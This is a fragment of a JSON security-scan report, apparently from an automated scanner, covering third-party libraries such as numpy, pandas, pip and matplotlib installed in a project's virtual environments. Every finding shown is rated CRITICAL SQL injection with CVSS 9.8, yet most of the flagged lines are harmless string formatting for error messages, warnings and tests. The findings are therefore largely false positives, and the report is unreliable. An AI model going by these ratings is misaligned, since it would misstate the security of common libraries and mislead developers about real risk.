            "line": 797,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(\"mode '{}' is not supported\".format(mode)) from None",
            "context": "        unsupported_kwargs = set(kwargs) - set(allowed_kwargs[mode])\n    except KeyError:\n        raise ValueError(\"mode '{}' is not supported\".format(mode)) from None\n    if unsupported_kwargs:\n        raise ValueError(\"unsupported keyword arguments for mode '{}': {}\"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_histograms_impl.py",
            "line": 289,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ".format(a.dtype, np.uint8),",
            "context": "    if a.dtype == np.bool:\n        warnings.warn(\"Converting input from {} to {} for compatibility.\"\n                      .format(a.dtype, np.uint8),\n                      RuntimeWarning, stacklevel=3)\n        a = a.astype(np.uint8)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_histograms_impl.py",
            "line": 392,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{!r} is not a valid estimator for `bins`\".format(bin_name))",
            "context": "        if bin_name not in _hist_bin_selectors:\n            raise ValueError(\n                \"{!r} is not a valid estimator for `bins`\".format(bin_name))\n        if weights is not None:\n            raise TypeError(\"Automated estimation of the number of \"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_histograms_impl.py",
            "line": 1027,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"`bins[{}]` must be an integer, when a scalar\".format(i)",
            "context": "            except TypeError as e:\n                raise TypeError(\n                \t\"`bins[{}]` must be an integer, when a scalar\".format(i)\n                ) from e\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_function_base_impl.py",
            "line": 5438,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "'length of {}'.format(N))",
            "context": "                raise ValueError('boolean array argument obj to delete '\n                                 'must be one dimensional and match the axis '\n                                 'length of {}'.format(N))\n\n            # optimization, the other branch is slower",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_index_tricks_impl.py",
            "line": 402,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"unknown special directive {!r}\".format(item)",
            "context": "                    except Exception as e:\n                        raise ValueError(\n                            \"unknown special directive {!r}\".format(item)\n                        ) from e\n                try:",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 155,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "outmess('Reading f2cmap from {!r} ...\\n'.format(f2cmap_file))",
            "context": "    # they use PARAMETERS in type specifications.\n    try:\n        outmess('Reading f2cmap from {!r} ...\\n'.format(f2cmap_file))\n        with open(f2cmap_file) as f:\n            d = eval(f.read().lower(), {}, {})",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/_dtype.py",
            "line": 30,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ".format(dtype.kind)",
            "context": "        raise RuntimeError(\n            \"internal dtype error, unknown kind {!r}\"\n            .format(dtype.kind)\n        ) from None\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/fromnumeric.py",
            "line": 569,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"not {name}\".format(name=type(a).__name__)) from e",
            "context": "    except AttributeError as e:\n        raise TypeError(\"argument 1 must be numpy.ndarray, \"\n                        \"not {name}\".format(name=type(a).__name__)) from e\n\n    return put(ind, v, mode=mode)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/memmap.py",
            "line": 225,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ".format(valid_filemodes + list(mode_equivalents.keys()), mode)",
            "context": "                raise ValueError(\n                    \"mode must be one of {!r} (got {!r})\"\n                    .format(valid_filemodes + list(mode_equivalents.keys()), mode)\n                ) from None\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/shape_base.py",
            "line": 598,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "'not allow implicit conversion from tuple to ndarray.'.format(",
            "context": "            '{} is a tuple. '\n            'Only lists can be used to arrange blocks, and np.block does '\n            'not allow implicit conversion from tuple to ndarray.'.format(\n                _block_format_index(parent_index)\n            )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/_exceptions.py",
            "line": 89,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "i_str = \"{} \".format(self.in_i) if self.ufunc.nin != 1 else \"\"",
            "context": "    def __str__(self):\n        # only show the number if more than one input exists\n        i_str = \"{} \".format(self.in_i) if self.ufunc.nin != 1 else \"\"\n        return (\n            \"Cannot cast ufunc {!r} input {}from {!r} to {!r} with casting \"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/_exceptions.py",
            "line": 93,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ").format(",
            "context": "            \"Cannot cast ufunc {!r} input {}from {!r} to {!r} with casting \"\n            \"rule {!r}\"\n        ).format(\n            self.ufunc.__name__, i_str, self.from_, self.to, self.casting\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/_exceptions.py",
            "line": 107,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "i_str = \"{} \".format(self.out_i) if self.ufunc.nout != 1 else \"\"",
            "context": "    def __str__(self):\n        # only show the number if more than one output exists\n        i_str = \"{} \".format(self.out_i) if self.ufunc.nout != 1 else \"\"\n        return (\n            \"Cannot cast ufunc {!r} output {}from {!r} to {!r} with casting \"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/_exceptions.py",
            "line": 111,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ").format(",
            "context": "            \"Cannot cast ufunc {!r} output {}from {!r} to {!r} with casting \"\n            \"rule {!r}\"\n        ).format(\n            self.ufunc.__name__, i_str, self.from_, self.to, self.casting\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/__init__.py",
            "line": 69,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ImportError(msg.format(path))",
            "context": "        \"numpy in {}. One method of fixing this is to repeatedly uninstall \"\n        \"numpy until none is found, then reinstall this version.\")\n    raise ImportError(msg.format(path))\n\nfrom . import numerictypes as nt",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/_internal.py",
            "line": 883,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ".format(ufunc, method, args_string, types_string))",
            "context": "    return ('operand type(s) all returned NotImplemented from '\n            '__array_ufunc__({!r}, {!r}, {}): {}'\n            .format(ufunc, method, args_string, types_string))\n\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/util.py",
            "line": 264,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "glob.glob(os.path.join(d, \"{:s}*\".format(module_name)))",
            "context": "        # relying on rebase being able to find that from the files.\n        _module_list.extend(\n            glob.glob(os.path.join(d, \"{:s}*\".format(module_name)))\n        )\n        subprocess.check_call(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_kind.py",
            "line": 24,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "), f\"selectedintkind({i}): expected {selected_int_kind(i)!r} but got {selectedintkind(i)!r}\"",
            "context": "            assert selectedintkind(i) == selected_int_kind(\n                i\n            ), f\"selectedintkind({i}): expected {selected_int_kind(i)!r} but got {selectedintkind(i)!r}\"\n\n    def test_real(self):",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_kind.py",
            "line": 36,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"",
            "context": "            assert selectedrealkind(i) == selected_real_kind(\n                i\n            ), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"\n\n    @pytest.mark.xfail(platform.machine().lower().startswith(\"ppc\"),",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_kind.py",
            "line": 49,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"",
            "context": "            assert selectedrealkind(i) == selected_real_kind(\n                i\n            ), f\"selectedrealkind({i}): expected {selected_real_kind(i)!r} but got {selectedrealkind(i)!r}\"\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_deprecations.py",
            "line": 251,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "x_str = \"1.51,2,3.51,4{}\".format(invalid_str)",
            "context": "    def test_deprecate_unparsable_string(self, invalid_str):\n        x = np.array([1.51, 2, 3.51, 4], dtype=float)\n        x_str = \"1.51,2,3.51,4{}\".format(invalid_str)\n\n        self.assert_deprecated(lambda: np.fromstring(x_str, sep=\",\"))",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_arrayprint.py",
            "line": 839,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "w = np.array(['1e{}'.format(i) for i in range(25)], dtype=np.float64)",
            "context": "\n        # also make sure 1e23 is right (is between two fp numbers)\n        w = np.array(['1e{}'.format(i) for i in range(25)], dtype=np.float64)\n        # note: we construct w from the strings `1eXX` instead of doing\n        # `10.**arange(24)` because it turns out the two are not equivalent in",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1990,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query(f\"SELECT * FROM {input()}\")  # not ok",
            "context": "\n          query(\"SELECT * FROM table\")  # ok\n          query(f\"SELECT * FROM {input()}\")  # not ok\n\n        See PEP 675 for details.",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/req/req_file.py",
            "line": 181,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "line_comes_from = \"{} {} (line {})\".format(",
            "context": ") -> ParsedRequirement:\n    # preserve for the nested code path\n    line_comes_from = \"{} {} (line {})\".format(\n        \"-c\" if line.constraint else \"-r\",\n        line.filename,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/models/search_scope.py",
            "line": 106,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Looking in links: {}\".format(",
            "context": "        if self.find_links:\n            lines.append(\n                \"Looking in links: {}\".format(\n                    \", \".join(redact_auth_from_url(url) for url in self.find_links)\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/resolution/resolvelib/candidates.py",
            "line": 194,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"{} {} (from {})\".format(",
            "context": "\n    def format_for_error(self) -> str:\n        return \"{} {} (from {})\".format(\n            self.name,\n            self.version,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/idna/core.py",
            "line": 68,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))",
            "context": "        if direction == '':\n            # String likely comes from a newer version of Unicode\n            raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))\n        if direction in ['R', 'AL', 'AN']:\n            bidi_label = True",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
            "line": 75,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "six.unichr(cc): u\"%{:02X}\".format(cc)",
            "context": "_HTML5_REPLACEMENTS.update(\n    {\n        six.unichr(cc): u\"%{:02X}\".format(cc)\n        for cc in range(0x00, 0x1F + 1)\n        if cc not in (0x1B,)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/packaging/tags.py",
            "line": 163,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"cp{version}{debug}{pymalloc}{ucs4}\".format(",
            "context": "    abis.insert(\n        0,\n        \"cp{version}{debug}{pymalloc}{ucs4}\".format(\n            version=version, debug=debug, pymalloc=pymalloc, ucs4=ucs4\n        ),",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 624,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = self.text_format.format(task=task)",
            "context": "\n    def render(self, task: \"Task\") -> Text:\n        _text = self.text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 751,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = text_format.format(task=task)",
            "context": "            self.text_format_no_percentage if task.total is None else self.text_format\n        )\n        _text = text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
            "line": 871,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "2, \"Exception occurred in plotting {}\\n from {}:\\n{}\".format(",
            "context": "        reporter = state.memo.reporter\n        sm = reporter.system_message(\n            2, \"Exception occurred in plotting {}\\n from {}:\\n{}\".format(\n                output_base, source_file_name, err),\n            line=lineno)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/backend_pgf.py",
            "line": 336,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ".format(tex, err.latex_output)) from err",
            "context": "            # backslashes.\n            raise ValueError(\"Error measuring {}\\nLaTeX Output:\\n{}\"\n                             .format(tex, err.latex_output)) from err\n        try:\n            # Parse metrics from the answer string.  Last line is prompt, and",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/backend_pgf.py",
            "line": 343,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ".format(tex, answer)) from err",
            "context": "        except Exception as err:\n            raise ValueError(\"Error measuring {}\\nLaTeX Output:\\n{}\"\n                             .format(tex, answer)) from err\n        w, h, o = float(width[:-2]), float(height[:-2]), float(offset[:-2])\n        # The height returned from LaTeX goes from base to top;",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/sql.py",
            "line": 2219,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "stmt = f\"SELECT {select_list} FROM {schema}.{table_name}\"",
            "context": "            select_list = \"*\"\n        if schema:\n            stmt = f\"SELECT {select_list} FROM {schema}.{table_name}\"\n        else:\n            stmt = f\"SELECT {select_list} FROM {table_name}\"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/sql.py",
            "line": 2221,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "stmt = f\"SELECT {select_list} FROM {table_name}\"",
            "context": "            stmt = f\"SELECT {select_list} FROM {schema}.{table_name}\"\n        else:\n            stmt = f\"SELECT {select_list} FROM {table_name}\"\n\n        with self.con.cursor() as cur:",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/pytables.py",
            "line": 4264,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "for field, op, filt in selection.filter.format():",
            "context": "        # apply the selection filters (but keep in the same order)\n        if selection.filter is not None:\n            for field, op, filt in selection.filter.format():\n                obj = process_filter(field, filt, op)\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/pytables.py",
            "line": 4318,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "for field, op, filt in selection.filter.format():",
            "context": "        coords = selection.select_coords()\n        if selection.filter is not None:\n            for field, op, filt in selection.filter.format():\n                data = self.read_column(\n                    field, start=coords.min(), stop=coords.max() + 1",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/pytables.py",
            "line": 5448,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "self.condition.format(), start=self.start, stop=self.stop",
            "context": "        if self.condition is not None:\n            return self.table.table.read_where(\n                self.condition.format(), start=self.start, stop=self.stop\n            )\n        elif self.coordinates is not None:",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/pytables.py",
            "line": 5471,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "self.condition.format(), start=start, stop=stop, sort=True",
            "context": "        if self.condition is not None:\n            return self.table.table.get_where_list(\n                self.condition.format(), start=start, stop=stop, sort=True\n            )\n        elif self.coordinates is not None:",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/resample.py",
            "line": 2913,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "new_message = _apply_groupings_depr.format(\"DataFrameGroupBy\", \"resample\")",
            "context": "    # GH#7155 - rewrite warning to appear as if it came from `.resample`\n    target_message = \"DataFrameGroupBy.apply operated on the grouping columns\"\n    new_message = _apply_groupings_depr.format(\"DataFrameGroupBy\", \"resample\")\n    with rewrite_warning(\n        target_message=target_message,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style_render.py",
            "line": 1829,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "func_0 = lambda x: formatter.format(x)",
            "context": "    # Get initial func from input string, input callable, or from default factory\n    if isinstance(formatter, str):\n        func_0 = lambda x: formatter.format(x)\n    elif callable(formatter):\n        func_0 = formatter",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 1750,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "msg.format(\"columns\", result.columns.shape, data.columns.shape)",
            "context": "        if not all(result.columns.isin(data.columns)):\n            raise ValueError(\n                msg.format(\"columns\", result.columns.shape, data.columns.shape)\n            )\n        self._update_ctx(result)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2729,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ">>> df.style.format(\"{:.1f}\").hide()  # doctest: +SKIP",
            "context": "        >>> midx = pd.MultiIndex.from_product([[\"x\", \"y\"], [\"a\", \"b\", \"c\"]])\n        >>> df = pd.DataFrame(np.random.randn(6,6), index=midx, columns=midx)\n        >>> df.style.format(\"{:.1f}\").hide()  # doctest: +SKIP\n                         x                    y\n           a      b      c      a      b      c",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3781,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\"selected 'axis': got {arg.shape}, \"",
            "context": "            raise ValueError(\n                f\"supplied '{arg_name}' is not correct shape for data over \"\n                f\"selected 'axis': got {arg.shape}, \"\n                f\"expected {data.shape}\"\n            )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/test_old_base.py",
            "line": 994,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "assert idx.format() == expected",
            "context": "        msg = r\"Index\\.format is deprecated\"\n        with tm.assert_produces_warning(FutureWarning, match=msg):\n            assert idx.format() == expected\n\n    def test_insert_non_na(self, simple_index):",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/test_sql.py",
            "line": 386,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "stmt = f\"SELECT count(*) AS count_1 FROM {table_name}\"",
            "context": "\ndef count_rows(conn, table_name: str):\n    stmt = f\"SELECT count(*) AS count_1 FROM {table_name}\"\n    adbc = import_optional_dependency(\"adbc_driver_manager.dbapi\", errors=\"ignore\")\n    if isinstance(conn, sqlite3.Connection):",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/test_sql.py",
            "line": 3574,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\"Select * from {table}\", conn, dtype_backend=dtype_backend",
            "context": "    with pd.option_context(\"mode.string_storage\", string_storage):\n        result = getattr(pd, func)(\n            f\"Select * from {table}\", conn, dtype_backend=dtype_backend\n        )\n        expected = dtype_backend_expected(string_storage, dtype_backend, conn_name)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/test_sql.py",
            "line": 3588,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\"Select * from {table}\",",
            "context": "    with pd.option_context(\"mode.string_storage\", string_storage):\n        iterator = getattr(pd, func)(\n            f\"Select * from {table}\",\n            con=conn,\n            dtype_backend=dtype_backend,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/test_sql.py",
            "line": 3756,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\"Select * from {table}\",",
            "context": "\n    result = getattr(pd, func)(\n        f\"Select * from {table}\",\n        conn,\n        dtype={\"a\": np.float64},",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/test_sql.py",
            "line": 4312,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "sql_select = f\"SELECT * FROM {table_name}\"",
            "context": "    df_if_exists_2 = DataFrame({\"col1\": [3, 4, 5], \"col2\": [\"C\", \"D\", \"E\"]})\n    table_name = \"table_if_exists\"\n    sql_select = f\"SELECT * FROM {table_name}\"\n\n    msg = \"'notvalidvalue' is not valid for if_exists\"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/interval/test_constructors.py",
            "line": 353,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "with pytest.raises(TypeError, match=msg.format(t=tuples)):",
            "context": "        tuples = [(0, 1), 2, (3, 4)]\n        msg = \"IntervalIndex.from_tuples received an invalid item, 2\"\n        with pytest.raises(TypeError, match=msg.format(t=tuples)):\n            IntervalIndex.from_tuples(tuples)\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/interval/test_constructors.py",
            "line": 359,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "with pytest.raises(ValueError, match=msg.format(t=tuples)):",
            "context": "        tuples = [(0, 1), (2,), (3, 4)]\n        msg = \"IntervalIndex.from_tuples requires tuples of length 2, got {t}\"\n        with pytest.raises(ValueError, match=msg.format(t=tuples)):\n            IntervalIndex.from_tuples(tuples)\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/interval/test_constructors.py",
            "line": 363,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "with pytest.raises(ValueError, match=msg.format(t=tuples)):",
            "context": "\n        tuples = [(0, 1), (2, 3, 4), (5, 6)]\n        with pytest.raises(ValueError, match=msg.format(t=tuples)):\n            IntervalIndex.from_tuples(tuples)\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/formats/style/test_to_latex.py",
            "line": 342,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "styler = df_ext.style.format(precision=2)",
            "context": "    ridx = MultiIndex.from_tuples([(\"A\", \"a\"), (\"A\", \"b\"), (\"B\", \"c\")])\n    df_ext.index, df_ext.columns = ridx, cidx\n    styler = df_ext.style.format(precision=2)\n\n    expected = dedent(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/formats/style/test_style.py",
            "line": 62,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "mi_styler.format(na_rep=\"MISSING\", precision=3)",
            "context": "    other.index = MultiIndex.from_product([[\"\"], other.index])\n    mi_styler.concat(other.style)\n    mi_styler.format(na_rep=\"MISSING\", precision=3)\n    mi_styler.format_index(precision=2, axis=0)\n    mi_styler.format_index(precision=4, axis=1)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/methods/test_replace.py",
            "line": 508,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "with pytest.raises(ValueError, match=msg.format(size=0)):",
            "context": "            \"input values to the 1 output values where the mask is true\"\n        )\n        with pytest.raises(ValueError, match=msg.format(size=0)):\n            obj.replace({np.nan: []})\n        with pytest.raises(ValueError, match=msg.format(size=2)):",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1990,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "query(f\"SELECT * FROM {input()}\")  # not ok",
            "context": "\n          query(\"SELECT * FROM table\")  # ok\n          query(f\"SELECT * FROM {input()}\")  # not ok\n\n        See PEP 675 for details.",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/req/req_file.py",
            "line": 181,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "line_comes_from = \"{} {} (line {})\".format(",
            "context": ") -> ParsedRequirement:\n    # preserve for the nested code path\n    line_comes_from = \"{} {} (line {})\".format(\n        \"-c\" if line.constraint else \"-r\",\n        line.filename,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/models/search_scope.py",
            "line": 106,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Looking in links: {}\".format(",
            "context": "        if self.find_links:\n            lines.append(\n                \"Looking in links: {}\".format(\n                    \", \".join(redact_auth_from_url(url) for url in self.find_links)\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/resolution/resolvelib/candidates.py",
            "line": 194,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"{} {} (from {})\".format(",
            "context": "\n    def format_for_error(self) -> str:\n        return \"{} {} (from {})\".format(\n            self.name,\n            self.version,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/idna/core.py",
            "line": 68,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))",
